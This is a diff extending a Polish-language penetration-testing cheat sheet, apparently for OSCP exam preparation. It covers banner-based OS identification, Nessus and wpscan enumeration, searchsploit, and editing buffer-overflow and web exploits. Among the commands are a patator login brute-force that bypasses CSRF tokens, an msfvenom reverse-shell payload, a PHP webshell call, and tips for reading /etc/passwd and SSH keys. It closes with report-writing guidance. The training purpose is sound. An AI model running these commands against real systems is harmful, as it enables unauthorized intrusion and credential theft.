@@ -112,6 +112,7 @@ nmap -v -p 139,445 --script smb $IP               # cała rodzina skryptów SMB
 nmap -p445 --script "vuln" $IP                     # znane podatności
 ls /usr/share/nmap/scripts/ | grep smb             # przegląd dostępnych skryptów
 ```
+> **Banner → wersja OS** (precyzyjny OS bez `-O`, zawęża CVE): `OpenSSH 8.9p1 Ubuntu 3` = 22.04 Jammy · `8.2p1` = 20.04 · `7.6p1` = 18.04 (potwierdź na launchpad.net). `Apache 2.4.x (Ubuntu)` / `IIS 10.0` = rodzina Windows Server. Brak numeru wersji (np. hMailServer) ≠ bezpieczne — szukaj CVE ręcznie.
 
 ## 1.3 Web enumeration
 
@@ -328,10 +329,18 @@ sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" $IP
 ### Nessus (GUI, kompleksowy skaner)
 ```bash
 sudo dpkg -i Nessus-*.deb        # instalacja z .deb (Kali)
-sudo systemctl start nessusd     # start usługi
-# konfiguracja: https://kali:8834/  → New Scan → Basic Network Scan → podaj zakres IP
+sudo systemctl start nessusd     # start usługi; https://kali:8834/
 ```
-> Inne skanery: **nikto** (web) `nikto -h http://$IP`, **wpscan** (WordPress) `wpscan --url http://$IP`, **nuclei** (szablony CVE) `nuclei -u http://$IP`.
+> **Basic Network Scan** = baseline (perspektywa sieciowa). **Credentialed Patch Audit** (New Scan → Credentials → Host → SSH: password/user/pass, *Elevate with sudo*) = brakujące patche + **lokalny privesc** (Baron Samedit CVE-2021-3156, HiveNightmare) — niewidoczne w skanie unauth! Linux=SSH, Windows=SMB+WMI. **Advanced Dynamic Scan** → *Dynamic Plugins* filtr `CVE is equal to CVE-XXXX` = przeczesanie pod jeden CVE. ⚠️ backport = string starej wersji → **false positive**; każdy finding = trop, nie dowód.
+
+> Inne skanery: **nikto** `nikto -h http://$IP`, **nuclei** `nuclei -u http://$IP`.
+> **wpscan (WordPress) — pluginy to miękki cel** (foothold zwykle przez przeterminowany plugin, nie rdzeń):
+```bash
+curl -s http://$IP | grep -Eo 'wp-content|wp-includes|wp-json'      # potwierdź WordPress
+wpscan --url http://$IP --enumerate vp,u,t --plugins-detection aggressive -o wpscan.txt   # vuln plugins, users, themes
+wpscan --url http://$IP --enumerate ap --plugins-detection aggressive --api-token <TOKEN>  # ALL pluginy + baza CVE
+```
+> „out of date" plugin → `searchsploit <plugin> <wersja>` (§2.12) → często arbitrary file read → `/etc/passwd` + `id_rsa`. Wersja pluginu bywa w `/wp-content/plugins/<x>/readme.txt`.
 
 ---
 
@@ -721,11 +730,13 @@ stty rows 38 columns 116
 searchsploit apache 2.4.49                # szukaj po nazwie/wersji
 searchsploit -t oracle windows            # -t = tylko w tytule
 searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
-searchsploit -m 42341                     # -m = skopiuj (mirror) exploit do CWD
+searchsploit -m 42341                     # -m = skopiuj (mirror) do CWD — ZAWSZE przed edycją (update nadpisuje repo!)
 searchsploit -p 39446                     # -p = pełna ścieżka + URL exploit-db
-ls /usr/share/exploitdb/exploits          # lokalne repo exploit-db
+searchsploit -s Apache 2.4.49             # -s strict (dokładna wersja) · -e exact tytuł · -w URL · -j JSON · --id
+grep -i qdpm /usr/share/exploitdb/files_exploits.csv    # szybki grep po CSV bez GUI
+grep -l Exploits /usr/share/nmap/scripts/*.nse          # NSE które REALNIE exploitują (zero pobierania PoC)
 ```
-> Źródła online: **exploit-db.com**, **github.com** (`site:github.com <produkt> <wersja> exploit`), **packetstorm**, **nvd.nist.gov** (CVE→opis), **vulners.com**.
+> **Offline (egzamin):** `sudo apt install exploitdb` PRZED egzaminem — masz tylko lokalne repo. Źródła online: **exploit-db.com**, **github.com** (`site:github.com`), **packetstorm**, **nvd.nist.gov**, **vulners.com**. Preferuj EDB-Verified/RCE nad DoS/surowy GitHub.
 
 ### Weryfikacja PoC przed uruchomieniem
 ```bash
@@ -744,7 +755,25 @@ wine exploit.exe                                       # bezpieczny test na Kali
 msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=443 EXITFUNC=thread \
   -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"         # -b = zakazane znaki (bad chars)
 ```
-> Typowe zmiany w PoC: IP/port atakującego, ścieżka/URL celu, offset i adres powrotu (`JMP ESP`), payload (`<?php system($_GET['cmd']);?>` dla webshelli). Exploity webowe uruchamiasz po edycji zwykle: `python2 exploit_modified.py`, potem `curl -k https://$IP/uploads/shell.php?cmd=whoami`.
+> Typowe zmiany w PoC: IP/port atakującego (C: `inet_addr("IP")` / `htons(80)` — PIERWSZE do zmiany), offset, adres powrotu, payload. **64-bit cel:** `x86_64-w64-mingw32-gcc 42341.c -o exp.exe -lws2_32` (i686 = 32-bit).
+
+**BOF — adres powrotu (JMP ESP) little-endian + walidacja modułu:**
+```c
+unsigned char retn[] = "\x83\x0c\x09\x10";   // adres 0x10090c83 zapisany OD TYŁU (little-endian)
+```
+> `objdump -d target.dll | grep 'jmp *esp'` (DLL wyciągnięty z celu). Debugger → *View > Executable modules* → potwierdź, że DLL z retn JEST załadowany; **unikaj systemowych DLL** (ASLR). Niezaładowany? → pożycz JMP ESP z siblinga EDB-Verified. **EIP przesunięty o 1 bajt?** off-by-one od null-terminatora (`strcpy` zjada bajt) → zwiększ `initial_buffer_size` o 1 (780→781).
+
+**Web-exploit (Python) — checklist:** HTTP/HTTPS? ścieżka? pre-auth czy creds? GET/POST? → dodaj `verify=False` na **KAŻDYM** `requests.*` (nie tylko pierwszym), zaktualizuj `base_url`+creds z loota. `IndexError: list index out of range` → nazwa parametru CSRF różni się; wstaw `print` PRZED padającą linią, zobacz realną odpowiedź, popraw. Weryfikuj: `curl -k https://$IP/uploads/shell.php?cmd=whoami`.
+
+**Brute formularza z tokenem CSRF (hydra nie umie — patator):**
+```bash
+patator http_fuzz url=http://$IP/login method=POST \
+  body='login[_csrf_token]=_TOKEN_&login[email]=FILE0&login[password]=FILE1' \
+  0=emails.txt 1=wordlist.txt before_urls=http://$IP/login \
+  before_egrep='_TOKEN_:name="login\[_csrf_token\]"[^>]*value="([^"]*)"' \
+  accept_cookie=1 follow=0 -x ignore:clen=116          # rozróżniaj sukces/błąd po Content-Length
+```
+> `before_urls` pobiera stronę przed KAŻDĄ próbą, `before_egrep` łapie świeży token do `_TOKEN_`, `accept_cookie=1` wiąże token z sesją. Łańcuch: `cewl`→wordlist + emaile z „About Us"→userzy → patator → creds → authenticated RCE.
 
 ## 2.13 Metasploit Framework (MSF)
 
@@ -2585,6 +2614,9 @@ hostname; whoami; ip a | grep inet          # Linux
 cat /root/proof.txt 2>/dev/null; cat /home/*/local.txt 2>/dev/null
 # Windows: type C:\Users\Administrator\Desktop\proof.txt & ipconfig & whoami
 ```
+> **Ustrukturyzowana notatka findingu** (raport = przeklejka z notatek): `Application` · `URL` · `Request Type` (GET/POST + ręczne zmiany) · `Issue Detail` (klasa/CVE) · **`PoC Payload`** (dokładny string + WSZYSTKIE preconditions — najważniejsze pole, bez tego finding nieodtwarzalny). Notuj nawet „oczywiste" kroki (że działałeś jako admin).
+> **Screeny:** `flameshot gui` — JEDEN koncept/obraz, widoczny URL + branding klienta + efekt PoC, caption ~8-10 słów, ZAWSZE podparte tekstem (sam alert XSS nie mówi za siebie).
+
 ## 14.2 Struktura raportu (OSCP / komercyjny)
 > 1. **Executive Summary** — dla zarządu, bez żargonu: co, jak źle, co dalej.
 > 2. **Scope & Methodology** — zakres (IP/domeny), okno czasowe, podejście (PTES/OSSTMM).
@@ -2593,6 +2625,13 @@ cat /root/proof.txt 2>/dev/null; cat /home/*/local.txt 2>/dev/null
 > 5. **Appendices** — pełne outputy, lista creds, użyte narzędzia.
 
 > ✍️ Zasady: każdy krok reprodukowalny; screeny czytelne (IP + proof widoczne); dla OSCP dołącz `local.txt`/`proof.txt` z każdej maszyny. Brak reprodukowalności = brak punktów, nawet gdy „miałeś” roota.
+
+> 🏢 **Wersja komercyjna (poza OSCP):**
+> - **PRZED testem:** uzgodnij **RoE** (co zakazane: DoS/social eng, kto jest referee) i **framework compliance** (HIPAA/PCI przeszacowuje severity — TLS 1.0 = naruszenie PCI, nie tylko słaby szyfr).
+> - **Executive Summary** (dla CISO/CFO): scope + timeframe + metodyka, **NIGDY absolutów** („unable to upload", nie „impossible" — miałeś ograniczony czas), kredytuj pozytywy hardeningu, **zapisz swój source IP + konta utworzone** (klient musi je usunąć).
+> - **Testing Environment Considerations** — okoliczności łagodzące (późne creds, za mało czasu vs za duży scope).
+> - **Technical Summary** — grupuj findingi po obszarach (Auth / Access Control / Patch Mgmt / Misconfig) + risk heat map; XSS+SQLi+upload razem = systemowy problem (niesanityzowany input → szkolenie devów).
+> - **Remediation** — konkretna, NIE warstwowa (każdy krok = osobne rozwiązanie), różna per klient (szpital: izolacja/patch-later; bank: brak patcha = critical). Unikaj fixów, których nikt nie wdroży.
 
 ---
 
